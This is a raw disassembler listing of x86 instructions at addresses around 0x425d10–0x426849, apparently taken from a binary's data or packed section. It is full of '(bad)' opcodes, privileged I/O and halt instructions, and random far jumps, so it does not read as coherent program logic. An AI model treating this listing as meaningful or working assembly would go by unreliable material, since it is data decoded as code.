  425d10:	sbb    edi,DWORD PTR [edi+0x19820086]
  425d16:	jge    0x425d6b
  425d18:	mov    ecx,0xfd34c082
  425d1d:	sbb    BYTE PTR [ebx+0x60],al
  425d20:	lgdtd  [eax]
  425d23:	push   esp
  425d24:	push   ss
  425d25:	jnp    0x425cad
  425d27:	nop
  425d28:	sub    BYTE PTR [eax+0x7d],al
  425d2b:	fisub  WORD PTR [ebp+0x172adc59]
  425d31:	push   0xffffffef
  425d33:	pop    ebp
  425d34:	mov    al,0x2d
  425d36:	push   si
  425d38:	or     DWORD PTR [esi],eax
  425d3a:	nop
  425d3b:	mov    ah,0x2
  425d3d:	mov    ch,0xe6
  425d3f:	mov    ebp,0x7a
	...
  425db4:	cmp    eax,0xf361d20c
  425db9:	(bad)  
  425dba:	mov    edi,0xa480315c
  425dbf:	in     al,dx
  425dc0:	loopne 0x425e24
  425dc2:	xlat   BYTE PTR ds:[ebx]
  425dc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425dc4:	lds    edx,FWORD PTR [edx+0xf50001]
  425dca:	add    BYTE PTR [eax],al
  425dcc:	or     BYTE PTR [ecx],cl
  425dce:	jmp    0xdc2:0xf1fa3d03
  425dd5:	pop    edi
  425dd6:	lahf   
  425dd7:	cdq    
  425dd8:	inc    ebp
  425dd9:	xor    al,0x9c
  425ddb:	pop    edx
  425ddc:	in     eax,dx
  425ddd:	mov    edx,0x9cd61b59
  425de2:	jnp    0x425dcc
  425de4:	push   0xffffffff
  425de6:	sub    bh,ch
  425de8:	ret    0xc53a
  425deb:	or     BYTE PTR [eax+0x221ced20],bl
  425df1:	popa   
  425df2:	jnp    0x425e4b
  425df4:	push   edi
  425df5:	xor    al,BYTE PTR [edi+edx*1-0x33]
  425df9:	mov    esi,0xf59bbc41
  425dfe:	cli    
  425dff:	xor    ch,BYTE PTR [eax-0x436825cd]
  425e05:	or     al,ah
  425e07:	daa    
  425e08:	push   edx
  425e09:	hlt    
  425e0a:	sti    
  425e0b:	(bad)  
  425e0d:	sub    eax,0xc112eaaf
  425e12:	cdq    
  425e13:	cmp    edx,ebp
  425e15:	mov    al,ds:0xc9d568b0
  425e1a:	push   edx
  425e1b:	pop    ebx
  425e1c:	sahf   
  425e1d:	or     al,cl
  425e1f:	inc    ecx
  425e20:	outs   dx,DWORD PTR ds:[esi]
  425e21:	cwde   
  425e22:	push   esp
  425e23:	jmp    0xb908:0xfca43047
  425e2a:	lea    ecx,fs:[edx+0x46]
  425e2e:	or     DWORD PTR [eax-0x476c89d5],ebp
  425e34:	add    dl,BYTE PTR ds:0xfb97c251
  425e3a:	add    eax,0xa0194b08
  425e3f:	mov    ebp,0xbd71aa7c
  425e44:	xor    eax,0x8d0fd025
  425e49:	(bad)  [esi]
  425e4b:	sti    
  425e4c:	pushf  
  425e4d:	(bad)  
  425e4e:	mov    edx,0x74a0709b
  425e53:	inc    ebp
  425e54:	push   0xfb70cd44
  425e59:	stos   BYTE PTR es:[edi],al
  425e5a:	dec    ebp
  425e5b:	push   ecx
  425e5c:	mov    ah,BYTE PTR [eax]
  425e5e:	into   
  425e5f:	jno    0x425e02
  425e61:	sub    esi,ecx
  425e63:	pop    ebp
  425e64:	(bad)  
  425e65:	push   esi
  425e66:	push   0x915fcbb8
  425e6b:	jl     0x425e2b
  425e6d:	pop    esp
  425e6e:	sub    BYTE PTR [ebx-0x26],ah
  425e71:	inc    esp
  425e72:	in     eax,dx
  425e73:	cli    
  425e74:	cmp    eax,0xa283098d
  425e79:	cmp    DWORD PTR [esi+ecx*1-0x680ce8de],0x89b44d30
  425e84:	dec    esp
  425e85:	push   edi
  425e86:	je     0x425e92
  425e88:	dec    esp
  425e89:	pop    esi
  425e8a:	push   ss
  425e8b:	jo     0x425e82
  425e8d:	and    al,0x7e
  425e8f:	sbb    BYTE PTR [ebp-0x80],dh
  425e92:	mov    ecx,0xc5957d1a
  425e97:	xor    esp,ebx
  425e99:	arpl   bp,sp
  425e9b:	jb     0x425e29
  425e9d:	dec    ebp
  425e9e:	out    dx,eax
  425e9f:	div    ebp
  425ea1:	xchg   edx,eax
  425ea2:	cld    
  425ea3:	ins    BYTE PTR es:[edi],dx
  425ea4:	bound  esi,QWORD PTR [eax+esi*8-0x12be41ce]
  425eab:	repz rol DWORD PTR [ecx],1
  425eae:	and    cl,0xde
  425eb1:	or     bl,BYTE PTR [edi-0x3b]
  425eb4:	sahf   
  425eb5:	imul   esi,DWORD PTR [esi-0x56a035e],0x504f0228
  425ebf:	out    dx,eax
  425ec0:	fwait
	...
  425f31:	add    BYTE PTR [eax],al
  425f33:	add    BYTE PTR [ebx+0x16],cl
  425f36:	int    0x41
  425f38:	fstp   st(3)
  425f3a:	iret   
  425f3b:	push   ds
  425f3c:	lock leave 
  425f3e:	jmp    DWORD PTR [ecx-0x67]
  425f41:	dec    esp
  425f42:	pop    edi
  425f43:	cmp    BYTE PTR [edx-0xafffe6d],0x0
  425f4a:	add    BYTE PTR [eax],al
  425f4c:	in     eax,0xc3
  425f4e:	in     eax,dx
  425f4f:	jno    0x425fc0
  425f51:	call   0xc5af:0x391f97d8
  425f58:	prefetcht2 BYTE PTR [esi+0x5a394420]
  425f5f:	iret   
  425f60:	mov    ah,BYTE PTR ds:0x1820a17c
  425f66:	div    al
  425f68:	mov    ds:0x9a08cae4,eax
  425f6d:	mov    al,0xb0
  425f6f:	xchg   ebp,eax
  425f70:	xchg   esp,eax
  425f71:	cmp    esp,edi
  425f73:	mov    ebp,0xfb290eb2
  425f78:	ficomp DWORD PTR [edi]
  425f7a:	or     eax,0x5cd5ab6c
  425f7f:	test   eax,0x843a74fe
  425f84:	nop
  425f85:	add    edi,edx
  425f87:	jmp    0xfe048319
  425f8c:	fstp   QWORD PTR [bx+si-0x1120]
  425f91:	inc    DWORD PTR [ebp+0x64]
  425f94:	dec    esp
  425f95:	repnz test BYTE PTR [ebx],bl
  425f98:	out    0xcb,eax
  425f9a:	shl    ebp,0xca
  425f9d:	nop
  425f9e:	aas    
  425f9f:	sbb    BYTE PTR [eax-0x10],ch
  425fa2:	jno    0x425f4a
  425fa4:	out    0x7a,al
  425fa6:	and    ah,BYTE PTR [edx+0x18]
  425fa9:	mov    edx,0xdf8129d6
  425fae:	mov    ebx,0x24c4438d
  425fb3:	or     eax,0xd707371f
  425fb8:	jecxz  0x42600c
  425fba:	stos   BYTE PTR es:[edi],al
  425fbb:	jge    0x425fc6
  425fbd:	push   cs
  425fbe:	lds    ecx,FWORD PTR [ecx-0xc]
  425fc1:	mov    esi,0x8578e7c9
  425fc6:	mov    ebx,0xa9dc7574
  425fcb:	mov    BYTE PTR [ebx-0xf30a240],dh
  425fd1:	mov    edx,0xb216c501
  425fd6:	push   ds
  425fd7:	call   0x521a:0xc114dd87
  425fde:	lods   eax,DWORD PTR ds:[esi]
  425fdf:	cmp    BYTE PTR [edx+0x16],ch
  425fe2:	mov    DWORD PTR [ebx-0x2b8f1e92],0x73fbf79b
  425fec:	and    BYTE PTR [ecx],ch
  425fee:	adc    al,0x84
  425ff0:	sbb    BYTE PTR [ebp-0x5f454aa0],0x8f
  425ff7:	sbb    al,0xf8
  425ff9:	or     cl,BYTE PTR [ecx-0x162393ff]
  425fff:	test   eax,0x99d84a6a
  426004:	jp     0x42605e
  426006:	pop    ds
  426007:	pop    edi
  426008:	outs   dx,BYTE PTR ds:[esi]
  426009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42600a:	mov    ah,0x50
  42600c:	inc    ebp
  42600d:	dec    ecx
  42600e:	loop   0x42600b
  426010:	jg     0x425f99
  426012:	mov    bh,0x5
  426014:	in     al,dx
  426015:	cli    
  426016:	imul   esp,DWORD PTR [eax],0xf28d6b34
  42601c:	rcl    DWORD PTR [ebx-0x60],0xd4
  426020:	mov    dh,0xac
  426022:	dec    edi
  426023:	into   
  426024:	out    0x18,eax
  426026:	pop    edi
  426027:	(bad)  
  426028:	arpl   cx,bx
  42602a:	xchg   BYTE PTR [eax],dl
  42602c:	gs xor ch,ah
  42602f:	rol    eax,1
  426031:	cmp    eax,0xf5306000
  426036:	stos   BYTE PTR es:[edi],al
  426037:	stos   BYTE PTR es:[edi],al
  426038:	stos   DWORD PTR es:[edi],eax
  426039:	cmp    eax,0x41585846
  42603e:	add    esi,DWORD PTR [edi]
  426040:	dec    ebx
	...
  4260b1:	add    BYTE PTR [eax],al
  4260b3:	add    dh,bl
  4260b5:	adc    DWORD PTR [edi-0x15020dd],ebx
  4260bb:	std    
  4260bc:	sub    al,0x28
  4260be:	pop    ds
  4260bf:	mov    eax,ds:0x9d090af3
  4260c4:	scas   eax,DWORD PTR es:[edi]
  4260c5:	xchg   esp,eax
  4260c6:	add    DWORD PTR [eax],eax
  4260c8:	cmc    
  4260c9:	add    BYTE PTR [eax],al
  4260cb:	add    BYTE PTR [edx+0xb8d2029],al
  4260d1:	pop    edx
  4260d2:	jp     0x426066
  4260d4:	imul   dh
  4260d6:	dec    DWORD PTR [esi-0x18]
  4260d9:	dec    esp
  4260da:	cwde   
  4260db:	shl    DWORD PTR [ebx],0x79
  4260de:	adc    al,0x69
  4260e0:	fistp  WORD PTR [edi-0x1]
  4260e3:	cmp    al,0x88
  4260e5:	pop    esp
  4260e6:	pop    DWORD PTR [edi+0x179aedaa]
  4260ec:	call   0xf609c9c
  4260f1:	pushf  
  4260f2:	rcr    BYTE PTR [ecx],cl
  4260f4:	mov    al,ds:0x7dd9f31d
  4260f9:	adc    DWORD PTR [esi],0x20
  4260fc:	or     DWORD PTR [ecx+0x48],ecx
  4260ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426100:	imul   ebp,DWORD PTR [ecx],0xb434d383
  426106:	mov    eax,ds:0xe86bfbe3
  42610b:	jne    0x4260f1
  42610d:	mov    WORD PTR [edi+0x79],?
  426110:	int3   
  426111:	jge    0x4260ab
  426113:	ret    
  426114:	sub    eax,DWORD PTR [edi+0x7e]
  426117:	daa    
  426118:	repz test al,0x30
  42611b:	mov    eax,ds:0x82b8699f
  426120:	push   ss
  426121:	(bad)  
  426122:	or     bh,BYTE PTR [esi+ebx*4-0x65]
  426126:	cli    
  426127:	mov    ds:0x1b3adc4f,al
  42612c:	inc    esi
  42612d:	and    al,0xe
  42612f:	cdq    
  426130:	pusha  
  426131:	mov    ?,ebx
  426133:	popf   
  426134:	pop    ss
  426135:	pop    ecx
  426136:	pop    edx
  426137:	outs   dx,BYTE PTR ds:[esi]
  426138:	fcom   QWORD PTR [edx-0x5c4a6ab]
  42613e:	fdivr  st,st(4)
  426140:	cmp    dh,BYTE PTR [esi-0x6fde5570]
  426146:	mov    eax,ds:0xdfa5d52f
  42614b:	push   0xa4f3f97b
  426150:	sub    eax,0xbd0be98b
  426155:	dec    BYTE PTR gs:[edi+0x3f]
  426159:	popf   
  42615a:	or     ebx,DWORD PTR [ecx]
  42615c:	out    dx,eax
  42615d:	inc    eax
  42615e:	sbb    ch,BYTE PTR [edi-0x32]
  426161:	es adc eax,0xc32e4525
  426167:	ret    
  426168:	dec    esi
  426169:	pcmpgtb mm0,QWORD PTR [ebx]
  42616c:	dec    BYTE PTR [ebx+0x170aa8b]
  426172:	hlt    
  426173:	hlt    
  426174:	jecxz  0x4261b5
  426176:	data16 mov ds:0x81628710,al
  42617c:	and    eax,0x6d31f615
  426181:	cmp    bl,BYTE PTR [edi+0x22]
  426184:	mov    edx,0xd290c12d
  426189:	icebp  
  42618a:	and    esi,DWORD PTR [eax]
  42618c:	je     0x426192
  42618e:	fsub   DWORD PTR [eax-0x7af453f6]
  426194:	leave  
  426195:	bound  esi,QWORD PTR [ebx]
  426197:	mov    BYTE PTR [edx+ebp*8-0x53],ch
  42619b:	mov    ebx,0x4c987882
  4261a0:	das    
  4261a1:	ss pop ds
  4261a3:	rcl    BYTE PTR [eax+ebx*1+0x7b60d210],cl
  4261aa:	push   ds
  4261ab:	mov    eax,ds:0xa8a8e24c
  4261b0:	xor    BYTE PTR [edi+0x64],ch
  4261b3:	scas   eax,DWORD PTR es:[edi]
  4261b4:	jmp    0xc1f0b2a6
  4261b9:	ins    BYTE PTR es:[edi],dx
  4261ba:	push   ss
  4261bb:	adc    BYTE PTR [esi+0x20],al
  4261be:	dec    edx
  4261bf:	mov    esi,0xf1
	...
  426234:	lods   al,BYTE PTR ds:[esi]
  426235:	les    esi,FWORD PTR [ebx-0x32]
  426238:	jnp    0x426239
  42623a:	mov    ebp,0xdfb43ee6
  42623f:	push   0x8
  426241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426242:	pop    esp
  426243:	fsub   QWORD PTR [ebp+edx*4+0xf50001]
  42624a:	add    BYTE PTR [eax],al
  42624c:	nop
  42624d:	fsubr  QWORD PTR [ebx]
  42624f:	imul   ecx,DWORD PTR [ebx-0x3e],0xdb5ae4d6
  426256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426257:	push   cs
  426258:	push   eax
  426259:	push   ecx
  42625a:	outs   dx,BYTE PTR ds:[esi]
  42625b:	mov    ebp,0x7f4bc8dd
  426260:	loop   0x4262d8
  426262:	or     ecx,DWORD PTR [esi]
  426264:	loopne 0x4262a1
  426266:	mov    ebx,0xd46ac17
  42626b:	dec    eax
  42626c:	mov    esp,0xda529949
  426271:	cs add al,0x3d
  426274:	imul   esi,DWORD PTR [ecx+0x7210f217],0x2f60b211
  42627e:	ins    DWORD PTR es:[edi],dx
  42627f:	dec    edi
  426280:	sbb    al,0xe2
  426282:	fbstp  TBYTE PTR [esi-0x75]
  426285:	inc    edi
  426286:	inc    ebp
  426287:	das    
  426288:	rcr    BYTE PTR [esi],cl
  42628a:	retf   0x2e88
  42628d:	ja     0x4262cd
  42628f:	out    dx,al
  426290:	dec    ecx
  426291:	enter  0x7fff,0x81
  426295:	lods   al,BYTE PTR ds:[esi]
  426296:	loop   0x426284
  426298:	cmp    bl,BYTE PTR [ebx]
  42629a:	je     0x426258
  42629c:	sub    esi,esp
  42629e:	mov    dl,0x29
  4262a0:	mov    esp,0xe1490186
  4262a5:	call   0x95fd:0x17ae95ab
  4262ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262ad:	das    
  4262ae:	adc    eax,DWORD PTR [ebp+0x33]
  4262b1:	leave  
  4262b2:	inc    esi
  4262b3:	mov    bh,0x2f
  4262b5:	lods   eax,DWORD PTR ds:[esi]
  4262b6:	test   bl,dl
  4262b8:	mov    ds:0xd61bdf87,al
  4262bd:	cmp    DWORD PTR [esi+0x2b],edx
  4262c0:	gs out dx,eax
  4262c2:	dec    esi
  4262c3:	inc    edi
  4262c4:	cmp    cl,BYTE PTR [eax]
  4262c6:	push   ds
  4262c7:	mov    WORD PTR [esi],ds
  4262c9:	adc    edi,DWORD PTR [esi+0x3b]
  4262cc:	dec    edi
  4262cd:	cdq    
  4262ce:	xor    ecx,DWORD PTR [ebp+ecx*2+0x4f]
  4262d2:	arpl   WORD PTR [edx-0xacb2be1],cx
  4262d8:	xchg   dh,dh
  4262da:	(bad)  
  4262db:	pop    esp
  4262dc:	inc    ecx
  4262dd:	jmp    0x4262e6
  4262df:	push   eax
  4262e0:	fdiv   DWORD PTR [edi]
  4262e2:	imul   edi,DWORD PTR ds:0x443488a5,0x8ac0edda
  4262ec:	cmp    al,0x9b
  4262ee:	repz int3 
  4262f0:	outs   dx,DWORD PTR ds:[esi]
  4262f1:	aad    0x96
  4262f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262f4:	sbb    al,BYTE PTR [ecx+eiz*4-0x67df9768]
  4262fb:	(bad)  [ebp-0x79b6e9d4]
  426301:	shl    BYTE PTR [ebx+ebx*4],0xbf
  426305:	stos   BYTE PTR es:[edi],al
  426306:	sub    eax,0x70cdab5b
  42630b:	add    al,0x1a
  42630d:	je     0x426376
  42630f:	cmp    ch,BYTE PTR [esi]
  426311:	inc    edi
  426312:	push   0x30
  426314:	pop    esp
  426315:	out    dx,eax
  426316:	rcl    BYTE PTR [ebx-0x2e],cl
  426319:	pop    ecx
  42631a:	add    cl,BYTE PTR [ecx]
  42631c:	sar    DWORD PTR [eax+0x381f3527],cl
  426322:	push   esi
  426323:	pop    ebx
  426324:	push   edx
  426325:	inc    ecx
  426326:	mov    ch,0x9
  426328:	scas   eax,DWORD PTR es:[edi]
  426329:	stos   BYTE PTR es:[edi],al
  42632a:	or     BYTE PTR [edi+0x6c],dh
  42632d:	and    BYTE PTR ds:0x5382273a,cl
  426333:	imul   eax,ecx,0xffb5d7f6
  426339:	push   ss
  42633a:	xlat   BYTE PTR ds:[ebx]
  42633b:	dec    edi
  42633c:	in     eax,dx
  42633d:	test   BYTE PTR [edx],bl
  42633f:	xor    eax,0xc2
	...
  4263b4:	inc    edx
  4263b5:	or     esp,eax
  4263b7:	test   eax,0xeb6fedcf
  4263bc:	(bad)  
  4263be:	mov    dh,0xba
  4263c0:	xchg   edx,ebx
  4263c2:	and    BYTE PTR [eax-0x67],dh
  4263c5:	xchg   esi,eax
  4263c6:	add    DWORD PTR [eax],eax
  4263c8:	cmc    
  4263c9:	add    BYTE PTR [eax],al
  4263cb:	add    dl,ch
  4263cd:	fdivr  QWORD PTR [ebp-0x39]
  4263d0:	inc    eax
  4263d1:	xchg   edx,eax
  4263d2:	push   0x718fede5
  4263d7:	mov    ebx,0x135535c4
  4263dc:	addr16 sub al,al
  4263df:	int    0x74
  4263e1:	jl     0x426372
  4263e3:	gs test eax,esp
  4263e6:	fwait
  4263e7:	xorps  xmm3,XMMWORD PTR [edx-0x38]
  4263eb:	nop
  4263ec:	(bad)  
  4263ed:	xchg   esi,eax
  4263ee:	jne    0x4263db
  4263f0:	push   eax
  4263f1:	and    al,0x74
  4263f3:	push   ebp
  4263f4:	shl    DWORD PTR ds:0x46c17670,0x93
  4263fb:	outs   dx,DWORD PTR ds:[esi]
  4263fc:	mov    dl,0x22
  4263fe:	into   
  4263ff:	call   0x6ccd:0x7e129cd1
  426406:	sbb    edi,ebp
  426408:	js     0x426420
  42640a:	in     al,0x2
  42640c:	jp     0x42638e
  42640e:	mov    cl,0xc0
  426410:	jb     0x4263d1
  426412:	add    BYTE PTR [ebx-0x1],cl
  426415:	sbb    dh,dl
  426417:	sub    BYTE PTR fs:[ebx+0x6c6d13b5],ah
  42641e:	loopne 0x426400
  426420:	pushf  
  426421:	sub    esi,eax
  426423:	sti    
  426424:	fwait
  426425:	cmp    DWORD PTR [esi],edx
  426427:	mov    edx,0x3a6b002f
  42642c:	repz out 0x8b,al
  42642f:	push   es
  426430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426431:	and    ebx,DWORD PTR [edx-0x6]
  426434:	retf   0x562
  426437:	inc    edi
  426438:	repz jb 0x4264a1
  42643b:	jnp    0x4264b2
  42643d:	mov    ch,0x4b
  42643f:	aas    
  426440:	(bad)  
  426442:	bound  ecx,QWORD PTR [esi]
  426444:	add    al,0x84
  426446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426447:	nop
  426448:	add    ebx,edx
  42644a:	fiadd  WORD PTR [edx]
  42644c:	jle    0x426473
  42644e:	out    dx,al
  42644f:	or     dl,BYTE PTR [edi+0x64]
  426452:	in     eax,dx
  426453:	cmp    DWORD PTR [ebx-0x42133d72],ebp
  426459:	and    DWORD PTR [eax-0x30],esp
  42645c:	jns    0x42640d
  42645e:	(bad)  
  42645f:	pop    ebx
  426460:	fld    DWORD PTR [eax]
  426462:	out    0x31,eax
  426464:	sar    BYTE PTR [ebx-0x5a5c78fa],0x87
  42646b:	dec    ecx
  42646c:	popf   
  42646d:	aaa    
  42646e:	sbb    eax,0xd7b60705
  426473:	(bad)  
  426475:	push   ebx
  426476:	cwde   
  426477:	aas    
  426478:	adc    al,0xda
  42647a:	and    eax,0x542edc0e
  42647f:	rol    BYTE PTR [ecx-0x63b7ce6],cl
  426485:	jge    0x42640a
  426487:	lea    esp,[ecx+0x3bf85b25]
  42648d:	xchg   ebp,eax
  42648e:	push   ecx
  42648f:	loop   0x4264f9
  426491:	std    
  426492:	sbb    bl,BYTE PTR ds:0x3f36222e
  426498:	stos   BYTE PTR es:[edi],al
  426499:	pop    DWORD PTR [esi+eax*4+0x6c24c493]
  4264a0:	popf   
  4264a1:	push   ebp
  4264a2:	mov    bl,dh
  4264a4:	scas   eax,DWORD PTR es:[edi]
  4264a5:	loop   0x426485
  4264a7:	cli    
  4264a8:	fist   WORD PTR [edx+0x2478f56d]
  4264ae:	stos   BYTE PTR es:[edi],al
  4264af:	pop    eax
  4264b0:	mov    WORD PTR [edi],gs
  4264b2:	sub    ah,BYTE PTR [esp+eiz*2+0x54]
  4264b6:	test   DWORD PTR [ebx],0x18dac727
  4264bc:	lahf   
  4264bd:	jge    0x426507
  4264bf:	lock jne 0x4264c2
	...
  426532:	add    BYTE PTR [eax],al
  426534:	(bad)  
  426535:	jmp    0xfef4:0xfe6e7a4e
  42653c:	loop   0x42656c
  42653e:	dec    ebx
  42653f:	pop    esp
  426540:	stos   DWORD PTR es:[edi],eax
  426541:	jle    0x4264fa
  426543:	adc    eax,0x1978e
  426548:	cmc    
  426549:	add    BYTE PTR [eax],al
  42654b:	add    ch,cl
  42654d:	sbb    edi,DWORD PTR [edx]
  42654f:	lock hlt 
  426551:	inc    ebx
  426552:	test   eax,0x32d82a30
  426557:	sub    cl,BYTE PTR ds:0x816cdc15
  42655d:	test   al,0x3e
  42655f:	jp     0x426547
  426561:	(bad)  
  426562:	in     eax,dx
  426563:	mov    edx,0xd7fce245
  426568:	xchg   edx,eax
  426569:	and    al,0xd2
  42656b:	(bad)  
  42656c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42656d:	scas   al,BYTE PTR es:[edi]
  42656e:	or     eax,0xc9444153
  426573:	inc    esp
  426574:	mov    BYTE PTR [esi],cl
  426576:	lds    eax,FWORD PTR [edi-0x37]
  426579:	test   DWORD PTR [ecx],eax
  42657b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42657c:	xor    ecx,DWORD PTR [edi+0x49]
  42657f:	mov    eax,ds:0xe0da3c44
  426584:	retf   0xdfa0
  426587:	das    
  426588:	loop   0x426597
  42658a:	test   eax,0x1b6e42a8
  42658f:	hlt    
  426590:	fstp   DWORD PTR [esi+0x66329cf7]
  426596:	or     dh,ah
  426598:	jl     0x4265e6
  42659a:	shl    BYTE PTR [ebp-0x175d2771],0xf8
  4265a1:	fadd   DWORD PTR [ebx+0x5412cbc2]
  4265a7:	mov    dl,0x82
  4265a9:	sahf   
  4265aa:	push   cs
  4265ab:	mov    edx,edi
  4265ad:	fisub  WORD PTR [ecx+ecx*2]
  4265b0:	xor    al,0xd
  4265b2:	jmp    0x426582
  4265b4:	repnz mov ch,0x7a
  4265b7:	ins    BYTE PTR es:[edi],dx
  4265b8:	mov    ch,dl
  4265ba:	add    eax,0x4cd99ff3
  4265bf:	mov    ecx,0x992c0bce
  4265c4:	jmp    0xd0b9e2e4
  4265c9:	dec    ecx
  4265ca:	fwait
  4265cb:	out    0x34,eax
  4265cd:	or     BYTE PTR [edx+0x44345445],dl
  4265d3:	sub    edx,edx
  4265d5:	pop    ss
  4265d6:	or     eax,0x65c57a0c
  4265db:	pusha  
  4265dc:	daa    
  4265dd:	xor    eax,0xf19c4420
  4265e2:	mov    edi,0xc8e1f60
  4265e7:	imul   ebp,edi,0x51
  4265ea:	add    ah,BYTE PTR [edi]
  4265ec:	dec    esi
  4265ed:	test   al,0x37
  4265ef:	adc    ch,BYTE PTR [eax+0x58764abb]
  4265f5:	jecxz  0x426602
  4265f7:	bnd jb 0x4265a6
  4265fa:	call   0x33e4ed20
  4265ff:	hlt    
  426600:	daa    
  426601:	mov    dl,0xe5
  426603:	lods   al,BYTE PTR ds:[esi]
  426604:	ds inc esi
  426606:	outs   dx,BYTE PTR ds:[esi]
  426607:	mov    esi,0x63ca11e3
  42660c:	add    esi,DWORD PTR [ebp+0x37]
  42660f:	pop    edx
  426610:	push   cs
  426611:	std    
  426612:	dec    esi
  426613:	enter  0xad7d,0x5d
  426617:	dec    ebp
  426618:	push   eax
  426619:	mov    ds:0xe88cf4ca,al
  42661e:	inc    eax
  42661f:	jl     0x42668d
  426621:	psubw  mm3,QWORD PTR [ebx+ecx*8+0x79]
  426626:	jno    0x4265cc
  426628:	out    dx,al
  426629:	mov    edi,0xd4f3a78a
  42662e:	scas   eax,DWORD PTR es:[edi]
  42662f:	daa    
  426630:	jp     0x42663a
  426632:	sbb    esp,DWORD PTR [esi]
  426634:	inc    eax
  426635:	test   eax,0x895cb140
  42663a:	fiadd  DWORD PTR [ecx-0xf]
  42663d:	(bad)  [ebx]
  42663f:	fsubr  st(2),st
	...
  4266b1:	add    BYTE PTR [eax],al
  4266b3:	add    dh,dl
  4266b5:	aaa    
  4266b6:	shl    BYTE PTR [ebx+esi*8],cl
  4266b9:	cmc    
  4266ba:	div    bh
  4266bc:	rcl    ah,cl
  4266be:	inc    esi
  4266bf:	pop    edi
  4266c0:	std    
  4266c1:	or     eax,DWORD PTR [eax+0x19883f1]
  4266c7:	add    ch,dh
  4266c9:	add    BYTE PTR [eax],al
  4266cb:	add    BYTE PTR [esp+edx*8],dl
  4266ce:	lea    ebp,[esi-0x60]
  4266d1:	fidivr WORD PTR [ecx+ecx*4+0x18]
  4266d5:	add    dh,bl
  4266d7:	sub    ch,ah
  4266d9:	inc    ebp
  4266da:	arpl   WORD PTR [ebx],bx
  4266dc:	pop    edi
  4266dd:	inc    ecx
  4266de:	xchg   ecx,eax
  4266df:	fldcw  WORD PTR [ebx-0x3f34fdbb]
  4266e5:	pop    ecx
  4266e6:	in     al,0x4e
  4266e8:	mov    bh,0x7f
  4266ea:	(bad)  
  4266eb:	outs   dx,BYTE PTR ds:[esi]
  4266ec:	jae    0x4266df
  4266ee:	sbb    al,0x7e
  4266f0:	add    al,0x90
  4266f2:	ja     0x4266aa
  4266f4:	jp     0x4266f9
  4266f6:	adc    ebx,ebx
  4266f8:	adc    cl,BYTE PTR [ebx]
  4266fa:	lods   al,BYTE PTR ds:[esi]
  4266fb:	test   ebx,esp
  4266fd:	js     0x4266f4
  4266ff:	test   DWORD PTR [ebx],esp
  426701:	(bad)  
  426702:	gs dec ebx
  426704:	scas   eax,DWORD PTR es:[edi]
  426705:	sub    DWORD PTR [ecx],0x31d1c6c
  42670b:	xor    al,0xcc
  42670d:	push   0x15399367
  426712:	outs   dx,DWORD PTR ds:[esi]
  426713:	or     eax,0xed298230
  426718:	das    
  426719:	lock lods al,BYTE PTR ds:[esi]
  42671b:	and    BYTE PTR [esi-0x2380444d],al
  426721:	add    al,0xbc
  426723:	sbb    dl,BYTE PTR [esi]
  426725:	push   ebx
  426726:	aaa    
  426727:	in     al,dx
  426728:	aad    0x19
  42672a:	jae    0x4266ce
  42672c:	mov    ebx,0xb0bef261
  426731:	ins    DWORD PTR es:[edi],dx
  426732:	sbb    al,0xf4
  426734:	leave  
  426735:	sub    BYTE PTR [edx],bl
  426737:	int    0xf7
  426739:	sar    DWORD PTR [edi-0x12],cl
  42673c:	and    al,0x15
  42673e:	stc    
  42673f:	cmp    BYTE PTR [edi-0x72393d83],bh
  426745:	retf   0xd7b5
  426748:	test   edx,eax
  42674a:	cmp    al,0x47
  42674c:	push   0x99521025
  426751:	repz pushf 
  426753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426754:	push   esp
  426755:	or     DWORD PTR [edi],esi
  426757:	or     dl,ah
  426759:	gs aad 0xb5
  42675c:	repnz fs test al,0xa0
  426760:	mov    BYTE PTR [ebp-0x14],al
  426763:	mov    DWORD PTR [ebp+0x0],eax
  426766:	mov    cs,WORD PTR [ebx-0x2e]
  426769:	jecxz  0x42676e
  42676b:	jns    0x4267b1
  42676d:	ins    BYTE PTR es:[edi],dx
  42676e:	jl     0x426735
  426770:	fwait
  426771:	pop    ebp
  426772:	das    
  426773:	dec    edi
  426774:	scas   eax,DWORD PTR es:[edi]
  426775:	xchg   edx,eax
  426776:	and    al,0x7c
  426778:	ss retf 
  42677a:	sbb    al,0x70
  42677c:	mov    eax,0xa7ab7ae2
  426781:	dec    ecx
  426782:	mov    ch,0x9e
  426784:	lods   al,BYTE PTR ds:[esi]
  426785:	jecxz  0x42674d
  426787:	push   ebp
  426788:	(bad)  
  426789:	fptan  
  42678b:	lods   eax,DWORD PTR ds:[esi]
  42678c:	ret    
  42678d:	sbb    al,0x13
  42678f:	mov    bh,0xe3
  426791:	mov    esp,DWORD PTR [edi]
  426793:	lock es sub dh,bh
  426797:	in     eax,dx
  426798:	sbb    cl,dh
  42679a:	lods   al,BYTE PTR ds:[esi]
  42679b:	and    bh,BYTE PTR [ebx]
  42679d:	sahf   
  42679e:	int3   
  42679f:	fld    QWORD PTR [ecx+0x57]
  4267a2:	push   eax
  4267a3:	xchg   BYTE PTR [edx+0x4f],bl
  4267a6:	mov    dh,BYTE PTR [eax+0x3effb7d4]
  4267ac:	jb     0x426736
  4267ae:	cdq    
  4267af:	push   es
  4267b0:	pop    ss
  4267b1:	test   eax,0x30126f54
  4267b6:	dec    edi
  4267b7:	(bad)  
  4267b8:	ret    
  4267b9:	leave  
  4267ba:	mov    eax,0x34ba588
  4267bf:	push   ebp
  4267c0:	popa   
	...
  426831:	add    BYTE PTR [eax],al
  426833:	add    BYTE PTR [edx+edx*2-0x70],bl
  426837:	push   edx
  426838:	sahf   
  426839:	rcr    dh,cl
  42683b:	pop    esi
  42683c:	test   BYTE PTR [esi+edi*8+0x7eb86634],cl
  426843:	jne    0x4268bd
  426845:	cdq    
  426846:	add    DWORD PTR [eax],eax
  426848:	cmc    
  426849:	add    BYTE PTR [eax],al
